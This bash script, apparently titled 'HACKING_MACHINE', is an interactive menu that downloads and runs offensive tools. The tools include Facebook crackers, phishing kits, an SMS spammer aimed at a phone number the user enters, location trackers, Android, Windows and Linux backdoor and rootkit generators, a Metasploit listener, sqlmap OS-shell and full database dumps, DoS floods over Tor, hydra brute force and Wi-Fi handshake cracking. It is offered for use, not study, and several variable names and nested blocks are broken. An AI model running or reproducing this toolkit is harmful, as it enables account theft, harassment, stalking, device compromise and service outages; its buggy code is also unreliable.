#!/bin/bash
echo "      ▄▄        ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄       
      ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄      
     ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄     
    ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄    
   ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █▄   
  ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄  
 ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄
                               HACKING_MACHINE

"
echo "
1) Social-Engineering hacking
2) Metasploit-Framework hacking
3) WEB hacking
4) WIFI/Wireless hacking
5) Encrypt/Decrypt "
read -p '<Answer> ' answer
 if [[ ( $answer == 1 ) ]]; then
echo "
1) Social accounts
2) SMS spamming
3) Tracking people
"
read -p '<Answer> ' answer2
  if [[ ( $answer2 == 1 ) ]]; then
 echo "
1) Facebook-cracker
2) Socialfish
3) weeman
"
read -p '<Answer> ' answer3
   if [[ ( $answer3 == 1 ) ]]; then
    cd Scripts
    if [ -d facebook-cracker ]; then
    cd facebook-cracker
    chmod +x facebook.py
    python facebook.py
    else
    git clone https://github.com/Ha3MrX/facebook-cracker
    cd facebook-cracker
    chmod +x facebook.py
    python facebook.py
    fi 
   fi
      if [[ ( $answer3 == 2 ) ]]; then
       cd Scripts
       if [ -d SocialFish ]; then
       cd SocialFish
       apt-get install python3-pip php unzip -y
       pip3 install -r requirements.txt
       python3 SocialFish.py 
       else
       git clone https://github.com/UndeadSec/SocialFish.git
       cd SocialFish
       apt-get install python3-pip php unzip -y
       pip3 install -r requirements.txt
       python3 SocialFish.py
       fi  
      fi
         if [[ ( $answer3 == 3 ) ]]; then
          cd Scripts
          if [ -d weeman ]; then
          cd weeman
          python weeman.py
          else
          git clone https://github.com/Cyber404Exploit/weeman.git
          cd weeman
          python weeman.py
          fi
         fi
  fi  
             if [[ ( $answer2 == 2 ) ]]; then
             read -p 'Phone Number (without +): ' phone
              if [ -d Spammer-Grab ]; then
              cd Spammer-Grab
              python2 spammer.py $phone --delay 10
              else
              git clone https://github.com/Noxturnix/Spammer-Grab.git
              cd Spammer-Grab
              ./auto-install.sh
              python2 spammer.py $phone --delay 10
              fi
             fi
                if [[ ( $answer2 == 3 ) ]]; then
                echo "
1) Seeker
2) Track url
3) Trape
                "
                read -p '<Answer> ' answer0
                  if [[ ( $answer0 == 1 ) ]]; then
                   cd Scripts   
                   if [ -d seeker ]; then
                   cd seeker/
                   chmod 777 install.sh
                   ./install.sh
                   python seeker.py
                   else
                   git clone https://github.com/thewhiteh4t/seeker.git
                   cd seeker/
                   chmod 777 install.sh 
                   ./install.sh
                   python seeker.py
                   fi
                  fi
                      if [[ ( $answer0 == 2 ) ]]; then
                       cd Scripts
                       if [ -d TrackUrl ]; then
                       cd TrackUrl
                       chmod 777 TrackUrl.sh
                       ./TrackUrl.sh
                       else
                       git clone https://github.com/Mauladen/TrackUrl.git
                       cd TrackUrl
                       chmod 777 TrackUrl.sh
                       ./TrackUrl.sh
                       fi
                      fi
                         if [[ ( $answer0 == 3 ) ]]; then
                          cd Scripts
                          if [ -d trape ]; then
                          read -p 'Web site to clone: ' web
                          read -p 'Port: ' port
                          cd trape 
                          pip install -r requirements.txt
                          python trape.py -u $web -p $port
                          else
                          read -p 'Web site to clone: ' web
                          read -p 'Port: ' port
                          git clone https://github.com/boxug/trape.git
                          cd trape
                          pip install -r requirements.txt
                          python trape.py -u $web -p $port 
                          fi
                         fi
                fi 



 fi  
 
   
                               if [[ ( $answer == 2 ) ]];then
echo "
1) Create payload
2) Start listener
3) Searchsploit
4) Use exploit
"
                               read -p '<Answer> ' answer22
                                if [[ ( $answer22 == 1 ) ]]; then 
echo "
1) Android_backdoor             
2) Windows_backdoor
3) Unix/MacOS_backdoor
4) Linux_backdoor/rootkit
"                              
                                read -p '<Answer> ' answer21
                                 
                                 if [[ ( $answer21 == 1 ) ]]; then 
                                 cd Scripts/AUTO_BACKDOOR/
                                 chmod +x backdoor_andoid_auto.sh
                                 ./backdoor_andoid_auto.sh
                                 fi
                                  if [[ ( $answer21 == 2 ) ]]; then 
                                  cd Scripts/AUTO_BACKDOOR/
                                  chmod +x windows_.sh
                                  ./backdoor_windows.sh
                                  fi
                                   if [[ ( $answer21 == 3 ) ]]; then
                                   echo "Coming Soon.."
                                   fi
                                    if [[ ( $answer21 == 4 ) ]]; then 
                                    cd Scripts/AUTO_BACKDOOR/
                                    chmod +x rootkit_linux.sh
                                    ./rootkit_linux.sh
                                    fi                                   
                                fi
                               fi
                                     if [[ ( $answer22 == 2 ) ]]; then
                                     read -p 'PAYLOAD= ' payload
                                     read -p 'LHOST= ' lhost
                                     read -p 'LPORT= ' lport
                                     mkdir listener
                                     cd listener/
                                     echo use exploit/multi/handler >> listener.rc
                                     echo set PAYLOAD $payload >> listener.rc
                                     echo set LHOST $lhost >> listener.rc
                                     echo set LPORT $lport >> listener.rc
                                     echo exploit >> listener.rc
                                     xterm -e "msfconsole -r listener.rc"
                                     fi
                                      if [[ ( $answer22 == 3 ) ]]; then
                                      read -p 'OS= ' os
                                      searchsploit $os 
                                      fi
                                       if [[ ( $answer22 == 4 ) ]]; then
                                       read -p 'Path to exploit= ' path
                                       cd Scripts
                                       echo use $path > use_exploit.rc
                                       xterm -e "msfconsole -r use_exploit.rc"
                                       fi
                                        if [[ ( $answer == 3 ) ]]; then
                                        echo "
1) Scanning
2) Exploits
3) DOS attack
4) DDOS attack
5) Bruteforce 
"
                                        read -p '<Answer> ' web1
                                         if [[ ( $web1 == 1 ) ]]; then
                                         echo "
1) Nmap
2) Nikto
3) SQL Map
4) Dirb
"  
                                        read -p '<Answer>' web2
                                          if [[ ( $web2 == 1 ) ]]; then 
                                          read -p 'IP/URL andress: ' an
                                          read -p 'Enable OS detect?Y/n: ' aos
                                           if [[ ( $aos == "Y" ) || ( $aos == "y" ) ]]; then
                                           nmap $an -O
                                           else if [[ ( $aos == "" ) || ( $aos == "N" ) || ( $aos == "n" ) ]]; then
                                           nmap $an
                                           fi   fi
                                          fi
                                         fi                           
                                        fi 
                                                  if [[ ( $web2 == 2 ) ]]; then
echo "
              Scan tuning:
1     Interesting File / Seen in logs
2     Misconfiguration / Default File
3     Information Disclosure
4     Injection (XSS/Script/HTML)
5     Remote File Retrieval - Inside Web Root
6     Denial of Service
7     Remote File Retrieval - Server Wide
8     Command Execution / Remote Shell
9     SQL Injection
0     File Upload
a     Authentication Bypass
b     Software Identification
c     Remote Source Inclusion
d     WebService
e     Administrative Console
x     Reverse Tuning Options (i.e., include all except specified)
"
read -p 'Choose: ' choose
read -p 'Write output?Y/n ' output
read -p 'IP/URL: ' ip
read -p 'Port: ' ports
                                                   if [[ ( $output == "Y" ) || ( $output == "y" ) ]]; then
                                                   read -p 'Path to output: ' paths
                                                   nikto -host $ip -Tuning -port $ports  $choose -output $paths
                                                   fi
                                                    if [[ ( $output == "N" ) || ( $output == "n" ) || ( $output == "" ) ]]; then
                                                    nikto -host $ip -Tuning -port $ports  $choose 
                                                    fi
                                                       
                                                                                                    
                                                  fi
                                                     if [[ ( $web2 == 3 ) ]]; then
                                                       read -p 'Use system accsess?Y/N: ' accsess
                                                      if [[ ( $accsess == "Y" ) || ( $accsess == "y" ) ]]; then
                                                       echo "
    --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
    --os-bof            Stored procedure buffer overflow exploitation
    --priv-esc          Database process user privilege escalation
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory

"
                                                          read -p 'Choose: ' choose2
                                                          read -p 'URL/IP: ' url
                                                          read -p 'Dump all DBMS?Y/n: ' dm
                                                           if [[ ( $dm == "Y" ) || ( $dm == "y" ) ]]; then
                                                           sqlmap -u $url $choose2 --dump-all
                                                           fi
                                                            if [[ ( $dm == "N" ) || ( $dm == "n" ) || ( $dm == "" ) ]]; then
                                                            sqlmap -u $url $choose2 --smart
                                                            fi
                                                           
                                                           
                                                           


                                                      fi
                                                     fi
                                                              if [[ ( $web2 == 4 ) ]]; then
                                                              echo "
                                                              
======================== OPTIONS ========================
 -a <agent_string> : Specify your custom USER_AGENT.
 -b : Use path as is.
 -E <certificate> : path to the client certificate.
 -f : Fine tunning of NOT_FOUND (404) detection.
 -H <header_string> : Add a custom header to the HTTP request.
 -i : Use case-insensitive search.
 -l : Print "Location" header when found.
 -p <proxy[:port]> : Use this proxy. (Default port is 1080)
 -P <proxy_username:proxy_password> : Proxy Authentication.
 -r : Don't search recursively.
 -R : Interactive recursion. (Asks for each directory)
 -t : Don't force an ending '/' on URLs.
 -X <extensions> / -x <exts_file> : Append each word with this extensions.
"                                                             read -p 'URL/IP: ' urls
                                                              read -p 'Choose: ' choose3
                                                              read -p 'Save output?Y/n: ' save
                                                             
                                                              read -p 'Enable silent-mode?Y/n: ' silent
                                                               if [[ ( $save == "Y" ) || ( $save == "y" ) && ( $silent == "Y" ) || ( $silent == "y" ) ]]; then
                                                               read -p 'Path to output: ' outputs 
                                                               dirb $urls $choose3 -S -o $outputs         
                                                               fi
                                                                if [[ ( $save == "N" ) || ( $save == "n" ) && ( $silent == "Y" ) || ( $silent == "y" ) ]]; then
                                                                dirb $urls $choose3 -S
                                                                fi 
                                                                   if [[ ( $save == "Y" ) || ( $save == "y" ) && ( $silent == "N" ) || ( $silent == "n" ) ]]; then
                                                                   read -p 'Path to output: ' outputs2
                                                                   dirb $urls $choose3 -o $outputs
                                                                   fi
                                                                     if [[ ( $save == "N" ) || ( $save == "n" ) && ( $silent == "Y" ) || ( $silent == "y" ) ]]; then

                                                                     dirb $urls $choose3
                                                                     fi



                                                              fi
                                                                       if [[ ( $web1 == 2 ) ]]; then
                                                                       read -p 'Which platform?: ' platform
                                                                       searchsploit $platform
                                                                       fi 
                                                                        if [[ ( $web1 == 3 ) ]]; then
                                                                        echo "
1) Hammer
2) Golden eye
3) Torshammer 
"
                                                                        read -p '<Answer> ' dos1
                                                                         if [[ ( $dos1 == 1 ) ]]; then 
                                                                           read -p 'IP: ' serversip
                                                                           read -p 'Port ' serversport
                                                                           cd Scripts/hammer
                                                                           python3 hammer.py -s $serversip -p $serversport
                                                                         fi
                                                                        fi
                                                                            if [[ ($dos1 == 2 ) ]]; then
                                                                            read -p 'IP/URL: ' usrlss
									    read -p 'Number of workers: ' workers
                                                                      	    read -p 'Metod(get or port): ' metod		
                                                                            cd Scripts/GoldenEye
                                                                            python3 goldeneye.py $urlss -w $workers -m $metod
                                                                            fi
                                                                              if [[ ( $dos1 == 3 ) ]]; then
                                                                                read -p 'IP/URL: ' usrlsss
                                                                            read -p 'Number of theards: ' theards
                                                                            read -p 'Enable TOR?y/N: ' tor
                                                                            cd Scripts/torshammer
                                                                               if [[ ( $tor == "Y" ) || ( $tor == "y" ) ]]; then
                                                                               python3 torshammer.py  -t $urlsss -r $theards -T
                                                                               fi
                                                                                if [[ ( $tor == "N" ) || ( $tor == "n" ) || ( $tor == "" ) ]]; then
                                                                                 python3 torshammer.py  -t $urlsss -r $theards
                                                                                fi 
                                                                                 if [[ ( $tor == "Y" ) || ( $tor == "y" ) ]]; then
                                                                                  python3 torshammer.py  -t $urlsss -r $theards -T
                                                                                 fi
                                                                              fi 
                                                                               
                                                                                     if [[ ( $web1 == 5 ) ]]; then
                                                                                     read -p 'IP: ' ips
                                                                                     read -p 'Wordlist of users names: ' names
                                                                                     read -p 'Wordlist of users passwords: ' passwordl
                                                                                     hydra -L $names -P $passwordl $ips
                                                                                     fi    
                                                                                       if [[ ( $answer == 4 ) ]]; then
                                                                                       echo "
1) Wifite
2) Airmon-ng 
3) Aircrack-ng
4) Airodump-ng
5) Xerosploit
6) mitmAP
7) Start interface
8) Start normal interface
" 
                                                                                      read -p '<Answer>  ' wifi1
                                                                                        if [[ ( $wifi1 == 1 ) ]]; then
                                                                                         wifite
                                                                                        fi
                                                                                         if [[ ( $wifi1 == 2 ) ]]; then
                                                                                         read -p '<start|stop|check> ' str
                                                                                         read -p 'Interface: ' interface
                                                                                          airmon-ng $str $interface
                                                                                         fi 
                                                                                          if [[ ( $wifi1 == 3 ) ]]; then
                                                                                          echo "
1) Create hccapx from cap
2) Speed test
3) Crack handshake
" 
                                                                                        read -p '<Answer> ' wifi2
                                                                                           if [[ ( $wifi2 == 1 ) ]]; then
                                                                                           read -p 'Path to cap(file): ' cap
                                                                                           aircrack-ng -j $cap
                                                                                           fi
                                                                                            if [[ ( $wifi2 == 2 ) ]]; then
                                                                                            aircrack-ng -S 
                                                                                            fi
                                                                                             if [[ ( $wifi2 == 3 ) ]]; then
                                                                                             read -p 'WEP(1)/WPA-PSK(2): ' wp
                                                                                             read -p 'BSSID: ' bssid
                                                                                             read -p 'Path to wordlist: ' wordlists
                                                                                             read -p 'Path to handshake: ' handshake
                                                                                             aircrack-ng -a$wp -b $bssid -w $wordlist $handshake
                                                                                             fi
                                                                                          fi 
                                                                                       fi
                                         
                                                                                               if [[ ( $wifi1 == 4 ) ]]; then
                                                                                               echo "
1) Scan all networks
2) Scan one network
3) Scan one network with handshake capture
"
                                                                                               read -p '<Answer> ' wifi3
                                                                                                if [[ ( $wifi3 == 1 ) ]]; then
                                                                                                ifconfig
                                                                                                read -p 'Select interface ' intr
                                                                                                airmon-ng check kill
                                                                                                airmon-ng start $intr
                                                                                                airodump-ng wlan0mon
                                                                                                fi
                                                                                                 if [[ ( $wifi3 == 2 ) ]]; then
                                                                                                 read -p 'BSSID: ' bssids
                                                                                                 read -p 'Channel: ' channel
                                                                                                 read -p 'Select interface ' intrs
                                                                                                 airmon-ng check kill
                                                                                                 airmon-ng start $intrs
                                                                                                 airodump-ng -c $channel --bssid $bssids wlan0mon
                                                                                                 fi     
                                                                                                   if [[  ( $wifi3 == 3 ) ]]; then
                                                                                                   read -p 'BSSID: ' bssids
                                                                                                   read -p 'Channel: ' channel
                                                                                                   ifconfig
                                                                                                   read -p 'Select interface: ' intrs
                                                                                                   read -p 'Path to write handshake: ' hand
                                                                                                   airmon-ng check kill
                                                                                                   airmon-ng start $intrs
                                                                                                   airodump-ng -c $channel --bssid $bssids -w $hand wlan0mon
                                                                                                   fi
                                                                                               fi
                                                                                                     if [[ ( $wifi1 == 5 ) ]]; then
                                                                                                      cd Scripts
                                                                                                      if [ -d xerosploit ]; then
                                                                                                      cd xerosploit
                                                                                                      python install.py
                                                                                                      xerosploit
                                                                                                      else
                                                                                                      cd Scripts
                                                                                                      git clone https://github.com/LionSec/xerosploit
                                                                                                      cd xerosploit && python install.py 
                                                                                                      xerosploit
                                                                                                      fi 
                                                                                                     fi
                                                                                                        if [[ ( $wifi1 == 6 ) ]]; then
                                                                                                        cd Scripts
                                                                                                         if [ -d mitmAP ]; then
                                                                                                         cd mitmAP
                                                                                                         python3 mitmAP.py
                                                                                                         else
                                                                                                         git clone https://github.com/xdavidhu/mitmAP
                                                                                                         cd mitmAP
                                                                                                         python3 mitmAP.py
                                                                                                         fi
                                                                                                        fi
                                                                                                            if [[ ( $wifi1 == 7 ) ]]; then
                                                                                                            ifconfig
                                                                                                            read -p 'Select interface:  ' intrss
                                                                                                            airmon-ng check kill
                                                                                                            airmon-ng start $intrss
                                                                                                            fi
                                                                                                              if [[ ( $wifi1 == 8 ) ]]; then
                                                                                                              ifconfig
                                                                                                              read -p 'Select interface: ' intrsss
                                                                                                              airmon-ng stop intrsss
                                                                                                              service network-manager restart
                                                                                                              fi
                                                                                                                if  [[ ( $answer == 5 ) ]]; then
                                                                                                                echo "
1) Create key
2) Export public key
3) Export secret key
4) Encrypt file
5) Decrypt file                                                                                                     
"
                                                                                                                read -p '<Answer> ' decr
                                                                                                                 if [[ ( $decr == 1 ) ]]; then
                                                                                                                 gpg --full-generate-key
                                                                                                                 fi
                                                                                                                  if [[ ( $decr == 2 ) ]]; then
                                                                                                                  read -p 'Name of key: ' key
                                                                                                                  gpg -a -o public.asc --export $key
                                                                                                                  fi
                                                                                                                   if [[ ( $decr == 3 ) ]]; then
                                                                                                                   read -p 'Name of key: ' key1
                                                                                                                   gpg -a --export-secret-keys $key1 > secret.asc
                                                                                                                   fi
                                                                                                                    if [[ ( $decr == 4 ) ]]; then
                                                                                                                     read -p 'Path to file: ' files
                                                                                                                     read -p 'Name of key: ' key2
                                                                                                                     read -p 'Path to key(public): ' public
                                                                                                                     gpg --import $public
                                                                                                                     gpg -e -r $key2 $files
                                                                                                                    fi
                                                                                                                     if [[ ( $decr == 5 ) ]]; then
                                                                                                                      read -p 'Path to file: ' filess
                                                                                                                     read -p 'Name of key: ' key3
                                                                                                                     read -p 'Path to key(secret): ' secret
                                                                                                                     gpg --import $secret
                                                                                                                     gpg -d -r $key3 $filess

                                                                                                                     fi
                                                                                                                fi
                                                                                                         

          
